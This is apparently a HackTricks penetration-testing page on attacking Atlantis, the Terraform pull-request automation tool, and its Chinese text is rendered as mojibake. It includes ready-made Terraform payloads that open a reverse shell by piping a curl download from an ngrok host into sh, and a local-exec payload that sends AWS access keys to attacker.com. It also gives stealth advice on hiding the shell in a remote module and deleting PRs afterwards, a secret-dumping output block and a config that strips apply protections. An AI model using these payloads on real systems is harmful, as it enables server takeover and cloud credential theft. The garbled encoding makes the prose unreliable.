# Atlantis Security

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

### åŸºæœ¬ä¿¡æ¯

Atlantis åŸºæœ¬ä¸Šå¸®åŠ©ä½ ä» git æœåŠ¡å™¨çš„ Pull Requests è¿è¡Œ terraformã€‚

![](<../.gitbook/assets/image (161).png>)

### æœ¬åœ°å®éªŒå®¤

1. å‰å¾€ **atlantis å‘å¸ƒé¡µé¢** [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) å¹¶ **ä¸‹è½½** é€‚åˆä½ çš„ç‰ˆæœ¬ã€‚
2. åˆ›å»ºä¸€ä¸ª **ä¸ªäººä»¤ç‰Œ**ï¼ˆå…·æœ‰ repo è®¿é—®æƒé™ï¼‰ä½ çš„ **github** ç”¨æˆ·
3. æ‰§è¡Œ `./atlantis testdrive`ï¼Œå®ƒå°†åˆ›å»ºä¸€ä¸ª **æ¼”ç¤ºä»“åº“** ä½ å¯ä»¥ç”¨æ¥ **ä¸ atlantis äº¤äº’**
1. ä½ å¯ä»¥åœ¨ 127.0.0.1:4141 è®¿é—®ç½‘é¡µ

### Atlantis è®¿é—®

#### Git æœåŠ¡å™¨å‡­æ®

**Atlantis** æ”¯æŒå¤šä¸ª git ä¸»æœºï¼Œå¦‚ **Github**ã€**Gitlab**ã€**Bitbucket** å’Œ **Azure DevOps**ã€‚\
ç„¶è€Œï¼Œä¸ºäº†è®¿é—®è¿™äº›å¹³å°ä¸Šçš„ä»“åº“å¹¶æ‰§è¡Œæ“ä½œï¼Œå®ƒéœ€è¦è·å¾—ä¸€äº› **ç‰¹æƒè®¿é—®æƒé™**ï¼ˆè‡³å°‘æ˜¯å†™æƒé™ï¼‰ã€‚\
[**æ–‡æ¡£**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) å»ºè®®åœ¨è¿™äº›å¹³å°ä¸Šä¸º Atlantis åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œä½†æœ‰äº›äººå¯èƒ½ä¼šä½¿ç”¨ä¸ªäººè´¦æˆ·ã€‚

{% hint style="warning" %}
æ— è®ºå¦‚ä½•ï¼Œä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œ**Atlantis è´¦æˆ·** å°†æ˜¯ä¸€ä¸ªéå¸¸ **æœ‰è¶£çš„** **ç›®æ ‡**ã€‚
{% endhint %}

#### Webhooks

Atlantis å¯é€‰åœ°ä½¿ç”¨ [**Webhook å¯†é’¥**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) æ¥éªŒè¯å®ƒä»ä½ çš„ Git ä¸»æœºæ¥æ”¶çš„ **webhooks** æ˜¯å¦ **åˆæ³•**ã€‚

ç¡®è®¤è¿™ä¸€ç‚¹çš„ä¸€ç§æ–¹æ³•æ˜¯ **ä»…å…è®¸æ¥è‡ª Git ä¸»æœºçš„ IP çš„è¯·æ±‚**ï¼Œä½†æ›´ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ Webhook å¯†é’¥ã€‚

è¯·æ³¨æ„ï¼Œé™¤éä½ ä½¿ç”¨ç§æœ‰çš„ github æˆ– bitbucket æœåŠ¡å™¨ï¼Œå¦åˆ™ä½ éœ€è¦å°† webhook ç«¯ç‚¹æš´éœ²åˆ°äº’è”ç½‘ã€‚

{% hint style="warning" %}
Atlantis å°† **æš´éœ² webhooks**ï¼Œä»¥ä¾¿ git æœåŠ¡å™¨å¯ä»¥å‘å…¶å‘é€ä¿¡æ¯ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œäº†è§£ **ä½ æ˜¯å¦å¯ä»¥å‘å…¶å‘é€æ¶ˆæ¯** å°†æ˜¯æœ‰è¶£çš„ã€‚
{% endhint %}

#### æä¾›è€…å‡­æ® <a href="#provider-credentials" id="provider-credentials"></a>

[æ¥è‡ªæ–‡æ¡£:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis é€šè¿‡ç®€å•åœ° **åœ¨æ‰˜ç®¡ Atlantis çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œ `terraform plan` å’Œ `apply`** å‘½ä»¤æ¥è¿è¡Œ Terraformã€‚å°±åƒåœ¨æœ¬åœ°è¿è¡Œ Terraform ä¸€æ ·ï¼ŒAtlantis éœ€è¦ä½ ç‰¹å®šæä¾›è€…çš„å‡­æ®ã€‚

ä½ å¯ä»¥é€‰æ‹©å¦‚ä½• [æä¾›å‡­æ®](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) ç»™ Atlantisï¼š

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) å’Œ [AWS Fargate æ¨¡å—](https://www.runatlantis.io/docs/deployment.html#aws-fargate) æœ‰è‡ªå·±çš„æä¾›è€…å‡­æ®æœºåˆ¶ã€‚é˜…è¯»å®ƒä»¬çš„æ–‡æ¡£ã€‚
* å¦‚æœä½ åœ¨äº‘ä¸­è¿è¡Œ Atlantisï¼Œé‚£ä¹ˆè®¸å¤šäº‘éƒ½æœ‰æ–¹æ³•ä¸ºåœ¨å…¶ä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åºæä¾›äº‘ API è®¿é—®æƒé™ï¼Œä¾‹å¦‚ï¼š
* [AWS EC2 è§’è‰²](https://registry.terraform.io/providers/hashicorp/aws/latest/docs)ï¼ˆæœç´¢ "EC2 Role"ï¼‰
* [GCE å®ä¾‹æœåŠ¡è´¦æˆ·](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* è®¸å¤šç”¨æˆ·è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚ `AWS_ACCESS_KEY`ï¼Œåœ¨ Atlantis è¿è¡Œçš„åœ°æ–¹ã€‚
* å…¶ä»–äººåˆ›å»ºå¿…è¦çš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚ `~/.aws/credentials`ï¼Œåœ¨ Atlantis è¿è¡Œçš„åœ°æ–¹ã€‚
* ä½¿ç”¨ [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) è·å–æä¾›è€…å‡­æ®ã€‚

{% hint style="warning" %}
**è¿è¡Œ** **Atlantis** çš„ **å®¹å™¨** å¾ˆå¯èƒ½ **åŒ…å«ç‰¹æƒå‡­æ®**ï¼Œç”¨äº Atlantis é€šè¿‡ Terraform ç®¡ç†çš„æä¾›è€…ï¼ˆAWSã€GCPã€Github...ï¼‰ã€‚
{% endhint %}

#### ç½‘é¡µ

é»˜è®¤æƒ…å†µä¸‹ï¼ŒAtlantis å°†åœ¨æœ¬åœ°ä¸»æœºçš„ **4141 ç«¯å£è¿è¡Œä¸€ä¸ªç½‘é¡µ**ã€‚è¯¥é¡µé¢ä»…å…è®¸ä½ å¯ç”¨/ç¦ç”¨ atlantis applyï¼Œæ£€æŸ¥ä»“åº“çš„è®¡åˆ’çŠ¶æ€å¹¶è§£é”å®ƒä»¬ï¼ˆä¸å…è®¸ä¿®æ”¹å†…å®¹ï¼Œå› æ­¤ä¸æ˜¯å¾ˆæœ‰ç”¨ï¼‰ã€‚

ä½ å¯èƒ½ä¸ä¼šå‘ç°å®ƒæš´éœ²åœ¨äº’è”ç½‘ä¸Šï¼Œä½†é»˜è®¤æƒ…å†µä¸‹ **ä¸éœ€è¦å‡­æ®** æ¥è®¿é—®å®ƒï¼ˆå¦‚æœéœ€è¦ï¼Œ`atlantis`:`atlantis` æ˜¯ **é»˜è®¤** çš„ï¼‰ã€‚

### æœåŠ¡å™¨é…ç½®

å¯¹ `atlantis server` çš„é…ç½®å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ ‡å¿—ã€ç¯å¢ƒå˜é‡ã€é…ç½®æ–‡ä»¶æˆ–ä¸‰è€…çš„æ··åˆæ¥æŒ‡å®šã€‚

* ä½ å¯ä»¥åœ¨ [**è¿™é‡Œæ‰¾åˆ°æ ‡å¿—åˆ—è¡¨**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) ç”± Atlantis æœåŠ¡å™¨æ”¯æŒ
* ä½ å¯ä»¥åœ¨ [**è¿™é‡Œæ‰¾åˆ°å¦‚ä½•å°†é…ç½®é€‰é¡¹è½¬æ¢ä¸ºç¯å¢ƒå˜é‡**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

å€¼çš„ **é€‰æ‹©é¡ºåº** ä¸ºï¼š

1. æ ‡å¿—
2. ç¯å¢ƒå˜é‡
3. é…ç½®æ–‡ä»¶

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œåœ¨é…ç½®ä¸­ä½ å¯èƒ½ä¼šå‘ç°æœ‰è¶£çš„å€¼ï¼Œå¦‚ **ä»¤ç‰Œå’Œå¯†ç **ã€‚
{% endhint %}

#### ä»“åº“é…ç½®

ä¸€äº›é…ç½®å½±å“ **ä»“åº“çš„ç®¡ç†æ–¹å¼**ã€‚ç„¶è€Œï¼Œå¯èƒ½ **æ¯ä¸ªä»“åº“éœ€è¦ä¸åŒçš„è®¾ç½®**ï¼Œå› æ­¤æœ‰æ–¹æ³•æŒ‡å®šæ¯ä¸ªä»“åº“ã€‚è¿™æ˜¯ä¼˜å…ˆé¡ºåºï¼š

1. ä»“åº“ [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶å¯ç”¨äºæŒ‡å®š atlantis åº”å¦‚ä½•å¤„ç†è¯¥ä»“åº“ã€‚ç„¶è€Œï¼Œé»˜è®¤æƒ…å†µä¸‹æŸäº›é”®åœ¨æ²¡æœ‰æŸäº›æ ‡å¿—å…è®¸çš„æƒ…å†µä¸‹æ— æ³•åœ¨æ­¤å¤„æŒ‡å®šã€‚
1. å¯èƒ½éœ€è¦é€šè¿‡æ ‡å¿—å¦‚ `allowed_overrides` æˆ– `allow_custom_workflows` è¿›è¡Œå…è®¸
2. [**æœåŠ¡å™¨ç«¯é…ç½®**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config)ï¼šä½ å¯ä»¥é€šè¿‡æ ‡å¿— `--repo-config` ä¼ é€’å®ƒï¼Œè¿™æ˜¯ä¸€ä¸ª yaml é…ç½®æ¯ä¸ªä»“åº“çš„æ–°è®¾ç½®ï¼ˆæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ï¼‰
3. **é»˜è®¤** å€¼

**PR ä¿æŠ¤**

Atlantis å…è®¸æŒ‡ç¤ºä½ æ˜¯å¦å¸Œæœ› **PR** è¢«å…¶ä»–äºº **`æ‰¹å‡†`**ï¼ˆå³ä½¿åœ¨åˆ†æ”¯ä¿æŠ¤ä¸­æœªè®¾ç½®ï¼‰å’Œ/æˆ– **`å¯åˆå¹¶`**ï¼ˆåˆ†æ”¯ä¿æŠ¤é€šè¿‡ï¼‰ **åœ¨è¿è¡Œ apply ä¹‹å‰**ã€‚ä»å®‰å…¨çš„è§’åº¦æ¥çœ‹ï¼Œè®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹æ˜¯æ¨èçš„ã€‚

å¦‚æœ `allowed_overrides` ä¸º Trueï¼Œè¿™äº›è®¾ç½®å¯ä»¥åœ¨æ¯ä¸ªé¡¹ç›®çš„ `/atlantis.yml` æ–‡ä»¶ä¸­ **è¢«è¦†ç›–**ã€‚

**è„šæœ¬**

ä»“åº“é…ç½®å¯ä»¥ **æŒ‡å®šè„šæœ¬** åœ¨ [**ä¹‹å‰**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_é¢„å·¥ä½œæµé’©å­_) å’Œ [**ä¹‹å**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_åå·¥ä½œæµé’©å­_) æ‰§è¡Œ **å·¥ä½œæµ**ã€‚

æ²¡æœ‰ä»»ä½•é€‰é¡¹å…è®¸åœ¨ **ä»“åº“ `/atlantis.yml`** æ–‡ä»¶ä¸­ **æŒ‡å®š** è¿™äº›è„šæœ¬ã€‚

**å·¥ä½œæµ**

åœ¨ä»“åº“é…ç½®ï¼ˆæœåŠ¡å™¨ç«¯é…ç½®ï¼‰ä¸­ï¼Œä½ å¯ä»¥ [**æŒ‡å®šæ–°çš„é»˜è®¤å·¥ä½œæµ**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow)ï¼Œæˆ– [**åˆ›å»ºæ–°çš„è‡ªå®šä¹‰å·¥ä½œæµ**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** ä½ è¿˜å¯ä»¥ **æŒ‡å®š** å“ªäº› **ä»“åº“** å¯ä»¥ **è®¿é—®** ç”Ÿæˆçš„ **æ–°** å·¥ä½œæµã€‚\
ç„¶åï¼Œä½ å¯ä»¥å…è®¸æ¯ä¸ªä»“åº“çš„ **atlantis.yaml** æ–‡ä»¶ **æŒ‡å®šè¦ä½¿ç”¨çš„å·¥ä½œæµ**ã€‚

{% hint style="danger" %}
å¦‚æœ [**æœåŠ¡å™¨ç«¯é…ç½®**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) æ ‡å¿— `allow_custom_workflows` è®¾ç½®ä¸º **True**ï¼Œåˆ™å¯ä»¥åœ¨æ¯ä¸ªä»“åº“çš„ **`atlantis.yaml`** æ–‡ä»¶ä¸­ **æŒ‡å®š** å·¥ä½œæµã€‚ä¹Ÿå¯èƒ½éœ€è¦ **`allowed_overrides`** ä¹ŸæŒ‡å®š **`workflow`** ä»¥ **è¦†ç›–å°†è¦ä½¿ç”¨çš„å·¥ä½œæµ**ã€‚\
è¿™å°†åŸºæœ¬ä¸Šç»™ **ä»»ä½•å¯ä»¥è®¿é—®è¯¥ä»“åº“çš„ç”¨æˆ·åœ¨ Atlantis æœåŠ¡å™¨ä¸Šæä¾› RCE**ã€‚
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Conftest ç­–ç•¥æ£€æŸ¥**

Atlantis æ”¯æŒåœ¨è®¡åˆ’è¾“å‡ºä¸Šè¿è¡Œ **server-side** [**conftest**](https://www.conftest.dev/) **ç­–ç•¥**ã€‚ä½¿ç”¨æ­¤æ­¥éª¤çš„å¸¸è§ç”¨ä¾‹åŒ…æ‹¬ï¼š

* æ‹’ç»ä½¿ç”¨æ¨¡å—åˆ—è¡¨
* åœ¨åˆ›å»ºæ—¶æ–­è¨€èµ„æºçš„å±æ€§
* æ•è·æ— æ„çš„èµ„æºåˆ é™¤
* é˜²æ­¢å®‰å…¨é£é™©ï¼ˆå³å°†å®‰å…¨ç«¯å£æš´éœ²ç»™å…¬ä¼—ï¼‰

æ‚¨å¯ä»¥åœ¨ [**æ–‡æ¡£**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) ä¸­æŸ¥çœ‹å¦‚ä½•é…ç½®å®ƒã€‚

### Atlantis å‘½ä»¤

[**åœ¨æ–‡æ¡£ä¸­**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) æ‚¨å¯ä»¥æ‰¾åˆ°è¿è¡Œ Atlantis çš„é€‰é¡¹ï¼š
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### æ”»å‡»

{% hint style="warning" %}
å¦‚æœåœ¨åˆ©ç”¨è¿‡ç¨‹ä¸­å‘ç°æ­¤ **é”™è¯¯**: `Error: Error acquiring the state lock`

æ‚¨å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥ä¿®å¤å®ƒ:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - åœ¨æ–°PRä¸­ä¿®æ”¹é…ç½®

å¦‚æœæ‚¨å¯¹ä¸€ä¸ªä»“åº“å…·æœ‰å†™å…¥æƒé™ï¼Œæ‚¨å°†èƒ½å¤Ÿåœ¨å…¶ä¸Šåˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯å¹¶ç”Ÿæˆä¸€ä¸ªPRã€‚å¦‚æœæ‚¨å¯ä»¥**æ‰§è¡Œ `atlantis plan`**ï¼ˆæˆ–è€…å®ƒå¯èƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œï¼‰ï¼Œ**æ‚¨å°†èƒ½å¤Ÿåœ¨AtlantisæœåŠ¡å™¨å†…éƒ¨è¿›è¡ŒRCE**ã€‚

æ‚¨å¯ä»¥é€šè¿‡è®©[**AtlantisåŠ è½½å¤–éƒ¨æ•°æ®æº**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source)æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚åªéœ€åœ¨`main.tf`æ–‡ä»¶ä¸­æ”¾å…¥å¦‚ä¸‹æœ‰æ•ˆè´Ÿè½½ï¼š
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**æ›´éšè”½çš„æ”»å‡»**

æ‚¨å¯ä»¥é€šè¿‡éµå¾ªä»¥ä¸‹å»ºè®®ä»¥**æ›´éšè”½çš„æ–¹å¼**æ‰§è¡Œæ­¤æ”»å‡»ï¼š

* ä¸å…¶ç›´æ¥å°†åå‘ shell æ·»åŠ åˆ° terraform æ–‡ä»¶ä¸­ï¼Œä¸å¦‚**åŠ è½½ä¸€ä¸ªåŒ…å«åå‘ shell çš„å¤–éƒ¨èµ„æº**ï¼š
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
æ‚¨å¯ä»¥åœ¨ [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) æ‰¾åˆ° rev shell ä»£ç ã€‚

* åœ¨å¤–éƒ¨èµ„æºä¸­ï¼Œä½¿ç”¨ **ref** åŠŸèƒ½æ¥éšè— **repo ä¸­æŸä¸ªåˆ†æ”¯çš„ terraform rev shell ä»£ç **ï¼Œç±»ä¼¼äºï¼š`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **è€Œä¸æ˜¯** åˆ›å»ºä¸€ä¸ª **PR åˆ° master** æ¥è§¦å‘ Atlantisï¼Œ**åˆ›å»º 2 ä¸ªåˆ†æ”¯**ï¼ˆtest1 å’Œ test2ï¼‰ï¼Œå¹¶ä»ä¸€ä¸ªåˆ†æ”¯åˆ›å»ºä¸€ä¸ª **PR åˆ°å¦ä¸€ä¸ªåˆ†æ”¯**ã€‚å½“æ‚¨å®Œæˆæ”»å‡»åï¼Œåªéœ€ **åˆ é™¤ PR å’Œåˆ†æ”¯**ã€‚

#### Atlantis è®¡åˆ’ç§˜å¯†è½¬å‚¨

æ‚¨å¯ä»¥é€šè¿‡åœ¨ terraform æ–‡ä»¶ä¸­æ”¾ç½®ç±»ä¼¼è¿™æ ·çš„å†…å®¹æ¥ **è½¬å‚¨ terraform ä½¿ç”¨çš„ç§˜å¯†**ï¼Œè¿è¡Œ `atlantis plan`ï¼ˆ`terraform plan`ï¼‰ï¼š
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - åœ¨æ–°PRä¸­ä¿®æ”¹é…ç½®

å¦‚æœæ‚¨å¯¹ä¸€ä¸ªä»“åº“å…·æœ‰å†™å…¥æƒé™ï¼Œæ‚¨å°†èƒ½å¤Ÿåœ¨å…¶ä¸Šåˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯å¹¶ç”Ÿæˆä¸€ä¸ªPRã€‚å¦‚æœæ‚¨å¯ä»¥**æ‰§è¡Œ `atlantis apply`ï¼Œæ‚¨å°†èƒ½å¤Ÿåœ¨AtlantisæœåŠ¡å™¨å†…éƒ¨è¿›è¡ŒRCE**ã€‚

ç„¶è€Œï¼Œæ‚¨é€šå¸¸éœ€è¦ç»•è¿‡ä¸€äº›ä¿æŠ¤ï¼š

* **å¯åˆå¹¶**ï¼šå¦‚æœåœ¨Atlantisä¸­è®¾ç½®äº†æ­¤ä¿æŠ¤ï¼Œæ‚¨åªèƒ½åœ¨**PRå¯åˆå¹¶æ—¶è¿è¡Œ `atlantis apply`**ï¼ˆè¿™æ„å‘³ç€éœ€è¦ç»•è¿‡åˆ†æ”¯ä¿æŠ¤ï¼‰ã€‚
* æ£€æŸ¥æ½œåœ¨çš„[**åˆ†æ”¯ä¿æŠ¤ç»•è¿‡**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **å·²æ‰¹å‡†**ï¼šå¦‚æœåœ¨Atlantisä¸­è®¾ç½®äº†æ­¤ä¿æŠ¤ï¼ŒæŸä¸ª**å…¶ä»–ç”¨æˆ·å¿…é¡»æ‰¹å‡†PR**ï¼Œæ‚¨æ‰èƒ½è¿è¡Œ `atlantis apply`
* é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨[**Gitbotä»¤ç‰Œæ¥ç»•è¿‡æ­¤ä¿æŠ¤**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

åœ¨æ¶æ„Terraformæ–‡ä»¶ä¸Šè¿è¡Œ**`terraform apply`ï¼Œä½¿ç”¨**[**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**ã€‚**\
æ‚¨åªéœ€ç¡®ä¿ä¸€äº›æœ‰æ•ˆè½½è·ï¼Œå¦‚ä»¥ä¸‹å†…å®¹ï¼Œç»“æŸäº `main.tf` æ–‡ä»¶ä¸­ï¼š
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
éµå¾ª**å‰ä¸€ç§æŠ€æœ¯çš„å»ºè®®**ä»¥æ›´**éšè”½çš„æ–¹å¼**æ‰§è¡Œæ­¤æ”»å‡»ã€‚

#### Terraform å‚æ•°æ³¨å…¥

å½“è¿è¡Œ `atlantis plan` æˆ– `atlantis apply` æ—¶ï¼Œterraform åœ¨åå°è¿è¡Œï¼Œæ‚¨å¯ä»¥é€šè¿‡åœ¨ atlantis ä¸­æ³¨é‡ŠæŸäº›å†…å®¹æ¥å‘ terraform ä¼ é€’å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
å¯ä»¥ä¼ é€’çš„å†…å®¹æ˜¯ç¯å¢ƒå˜é‡ï¼Œè¿™å¯èƒ½æœ‰åŠ©äºç»•è¿‡æŸäº›ä¿æŠ¤ã€‚è¯·æŸ¥çœ‹ terraform ç¯å¢ƒå˜é‡åœ¨ [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

#### è‡ªå®šä¹‰å·¥ä½œæµ

è¿è¡Œåœ¨ `atlantis.yaml` æ–‡ä»¶ä¸­æŒ‡å®šçš„ **æ¶æ„è‡ªå®šä¹‰æ„å»ºå‘½ä»¤**ã€‚Atlantis ä½¿ç”¨æ¥è‡ªæ‹‰å–è¯·æ±‚åˆ†æ”¯çš„ `atlantis.yaml` æ–‡ä»¶ï¼Œ**è€Œä¸æ˜¯** `master`ã€‚\
è¿™ä¸ªå¯èƒ½æ€§åœ¨å‰é¢çš„éƒ¨åˆ†ä¸­æåˆ°è¿‡ï¼š

{% hint style="danger" %}
å¦‚æœ [**æœåŠ¡å™¨ç«¯é…ç½®**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) æ ‡å¿— `allow_custom_workflows` è®¾ç½®ä¸º **True**ï¼Œåˆ™å¯ä»¥åœ¨æ¯ä¸ªä»“åº“çš„ **`atlantis.yaml`** æ–‡ä»¶ä¸­ **æŒ‡å®š** å·¥ä½œæµã€‚è¿˜å¯èƒ½éœ€è¦ **`allowed_overrides`** ä¹ŸæŒ‡å®š **`workflow`** ä»¥ **è¦†ç›–å°†è¦ä½¿ç”¨çš„å·¥ä½œæµ**ã€‚

è¿™åŸºæœ¬ä¸Šä¼šç»™ **ä»»ä½•å¯ä»¥è®¿é—®è¯¥ä»“åº“çš„ç”¨æˆ·åœ¨ Atlantis æœåŠ¡å™¨ä¸Šæä¾› RCE**ã€‚
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### ç»•è¿‡è®¡åˆ’/åº”ç”¨ä¿æŠ¤

å¦‚æœ [**æœåŠ¡å™¨ç«¯é…ç½®**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) æ ‡å¿— `allowed_overrides` _å·²_ é…ç½® `apply_requirements`ï¼Œåˆ™ä¸€ä¸ªä»“åº“å¯ä»¥ **ä¿®æ”¹è®¡åˆ’/åº”ç”¨ä¿æŠ¤ä»¥ç»•è¿‡å®ƒä»¬**ã€‚
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

å¦‚æœæœ‰äººåœ¨æ‚¨çš„æœ‰æ•ˆæ‹‰å–è¯·æ±‚ä¸Šå‘é€ **`atlantis plan/apply`** è¯„è®ºï¼Œè¿™å°†å¯¼è‡´ terraform åœ¨æ‚¨ä¸å¸Œæœ›å®ƒè¿è¡Œæ—¶æ‰§è¡Œã€‚

æ­¤å¤–ï¼Œå¦‚æœæ‚¨æ²¡æœ‰åœ¨ **åˆ†æ”¯ä¿æŠ¤** ä¸­é…ç½®åœ¨ **æ–°æäº¤æ¨é€** åˆ°å®ƒæ—¶è¦æ±‚ **é‡æ–°è¯„ä¼°** æ¯ä¸ª PRï¼Œé‚£ä¹ˆæœ‰äººå¯èƒ½ä¼šåœ¨ terraform é…ç½®ä¸­ **ç¼–å†™æ¶æ„é…ç½®**ï¼ˆæŸ¥çœ‹ä¹‹å‰çš„åœºæ™¯ï¼‰ï¼Œè¿è¡Œ `atlantis plan/apply` å¹¶è·å¾— RCEã€‚

è¿™æ˜¯ Github åˆ†æ”¯ä¿æŠ¤ä¸­çš„ **è®¾ç½®**ï¼š

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

å¦‚æœæ‚¨è®¾æ³• **çªƒå– webhook secret** æˆ–è€… **æ²¡æœ‰ä½¿ç”¨ä»»ä½• webhook secret**ï¼Œæ‚¨å¯ä»¥ **è°ƒç”¨ Atlantis webhook** å¹¶ **ç›´æ¥è°ƒç”¨ atlantis å‘½ä»¤**ã€‚

#### Bitbucket

Bitbucket Cloud **ä¸æ”¯æŒ webhook secrets**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€… **ä¼ªé€ æ¥è‡ª Bitbucket çš„è¯·æ±‚**ã€‚ç¡®ä¿æ‚¨åªå…è®¸ Bitbucket IPã€‚

* è¿™æ„å‘³ç€ **æ”»å‡»è€…** å¯ä»¥å‘ **Atlantis** å‘å‡ºçœ‹ä¼¼æ¥è‡ª Bitbucket çš„ **è™šå‡è¯·æ±‚**ã€‚
* å¦‚æœæ‚¨æŒ‡å®šäº† `--repo-allowlist`ï¼Œé‚£ä¹ˆä»–ä»¬åªèƒ½ä¼ªé€ ä¸é‚£äº›ä»“åº“ç›¸å…³çš„è¯·æ±‚ï¼Œå› æ­¤ä»–ä»¬èƒ½é€ æˆçš„æœ€å¤§æŸå®³å°†æ˜¯å¯¹æ‚¨è‡ªå·±ä»“åº“çš„ plan/applyã€‚
